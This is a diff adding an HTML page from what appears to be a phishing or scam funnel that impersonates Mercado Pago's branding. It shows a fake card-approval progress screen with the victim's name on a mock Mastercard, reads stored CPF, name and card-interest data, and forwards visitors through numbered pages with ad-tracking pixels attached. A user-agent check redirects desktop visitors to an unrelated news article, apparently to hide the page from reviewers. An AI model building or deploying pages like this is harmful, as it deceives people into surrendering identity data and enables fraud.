@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <title>Processando Solicitação - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #FFE600;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #3483FA;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #3483FA;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 50px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .card {
+            background: linear-gradient(135deg, #3483FA, #2968C8);
+            border-radius: 12px;
+            padding: 20px;
+            height: 200px;
+            width: 340px;
+            margin: 0 auto 30px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(52, 131, 250, 0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 60px;
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: absolute;
+            bottom: 15px;
+            left: 20px;
+            right: 20px;
+        }
+
+        .card-name {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            color: rgb(255, 255, 255);
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        /* Logo pequeno para o cartão */
+        .card-logo {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+        .processing-steps {
+            margin-bottom: 40px;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 0;
+            border-bottom: 1px solid #EDEDED;
+            opacity: 0.3;
+            transition: all 0.5s ease;
+            animation: slideInLeft 0.5s ease-out both;
+        }
+        .step:last-child {
+            border-bottom: none;
+        }
+        .step.active {
+            opacity: 1;
+            color: #3483FA;
+            font-weight: 600;
+        }
+        .step.completed {
+            opacity: 1;
+            color: #00A650;
+        }
+        .step:nth-child(1) { animation-delay: 0.5s; }
+        .step:nth-child(2) { animation-delay: 0.7s; }
+        .step:nth-child(3) { animation-delay: 0.9s; }
+        .step:nth-child(4) { animation-delay: 1.1s; }
+        .step:nth-child(5) { animation-delay: 1.3s; }
+        @keyframes slideInLeft {
+            from { transform: translateX(-30px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .step-text {
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #EDEDED;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .step.active .step-icon {
+            border-color: #3483FA;
+            background: #3483FA;
+        }
+        .step.active .step-icon::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: #FFFFFF;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        .step.completed .step-icon {
+            border-color: #00A650;
+            background: #00A650;
+        }
+        .step.completed .step-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 20px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .card {
+                width: 100%;
+                max-width: 320px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Aguarde enquanto processamos seu pedido</h1>
+
+        <div class="card">
+            <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
+
+            <div class="card-top">
+                <!-- Logo pequeno no cartão -->
+                <div class="card-logo">
+                    <img src="https://i.postimg.cc/0Qz4HdcQ/icone.png" alt="Mercado Pago" style="width: 50px; height: auto;">
+                </div>
+                <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Inter', sans-serif; text-transform: uppercase; letter-spacing: 1px;">Platinum</div>
+            </div>
+
+            <div style="position: absolute; top: 60%; left: 0; transform: translateY(-50%); width: 100%;">
+                <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                    <div style="display: flex; align-items: center; margin-left: 20px;">
+                        <img src="https://i.postimg.cc/VNBsLddY/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
+                    </div>
+                    <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
+                </div>
+            </div>
+
+            <div class="card-bottom">
+                <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                    <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">NOME DO TITULAR</span>
+                    <span style="font-size: 8px; color: rgba(255, 255, 255, 0.7); font-family: 'Inter', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: flex-end; justify-content: flex-end;">
+                    <img src="https://logos-world.net/wp-content/uploads/2020/09/Mastercard-Logo.png" alt="mastercard" style="width: 50px;">
+                </div>
+            </div>
+
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
+        </div>
+
+        <div class="processing-steps">
+            <div class="step" id="step1">
+                <span class="step-text">Aguardando resposta</span>
+                <div class="step-icon"></div>
+            </div>
+            <div class="step" id="step2">
+                <span class="step-text">Analisando seu perfil</span>
+                <div class="step-icon"></div>
+            </div>
+            <div class="step" id="step3">
+                <span class="step-text">Preparando seu cartão</span>
+                <div class="step-icon"></div>
+            </div>
+            <div class="step" id="step4">
+                <span class="step-text">Finalizando solicitação</span>
+                <div class="step-icon"></div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página 7:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO
+        // =======================================================
+
+        const UserData = {
+            save: function(dados) {
+                sessionStorage.setItem('user_data', JSON.stringify(dados));
+            },
+
+            load: function() {
+                const dados = sessionStorage.getItem('user_data');
+                return dados ? JSON.parse(dados) : null;
+            },
+
+            update: function(novosDados) {
+                const dadosExistentes = this.load() || {};
+                const dadosAtualizados = { ...dadosExistentes, ...novosDados };
+                this.save(dadosAtualizados);
+                return dadosAtualizados;
+            },
+
+            clear: function() {
+                sessionStorage.removeItem('user_data');
+            }
+        };
+
+        const dadosUsuario = UserData.load();
+        console.log('Dados do usuário carregados:', dadosUsuario);
+
+        UserData.update({
+            etapa_atual: 'processamento',
+            processamento_inicio: new Date().toISOString()
+        });
+
+        if (dadosUsuario && dadosUsuario.nome) {
+            document.getElementById('cardName').textContent = dadosUsuario.nome.toUpperCase();
+        }
+
+        const steps = ['step1', 'step2', 'step3', 'step4'];
+        let currentStep = 0;
+
+        function processNextStep() {
+            if (currentStep > 0) {
+                const prevStep = document.getElementById(steps[currentStep - 1]);
+                prevStep.classList.remove('active');
+                prevStep.classList.add('completed');
+            }
+
+            if (currentStep < steps.length) {
+                const currentStepElement = document.getElementById(steps[currentStep]);
+                currentStepElement.classList.add('active');
+
+                currentStep++;
+
+                setTimeout(processNextStep, 2500);
+            } else {
+                setTimeout(() => {
+                    UserData.update({
+                        processamento_concluido: true,
+                        processamento_fim: new Date().toISOString()
+                    });
+
+                    // =======================================================
+                    // REDIRECIONAMENTO ATUALIZADO PARA PRESERVAR PARÂMETROS
+                    // =======================================================
+
+                    // ALTERE '8.html' para o nome da próxima página
+                    window.location.href = buildUrlWithParams('7.html');
+                }, 1000);
+            }
+        }
+
+        setTimeout(processNextStep, 1000);
+
+        if (dadosUsuario) {
+            console.log('CPF:', dadosUsuario.cpf);
+            console.log('Nome:', dadosUsuario.nome);
+            console.log('Interesse:', dadosUsuario.interesse_cartao);
+        }
+    </script>
+</body>
+</html>
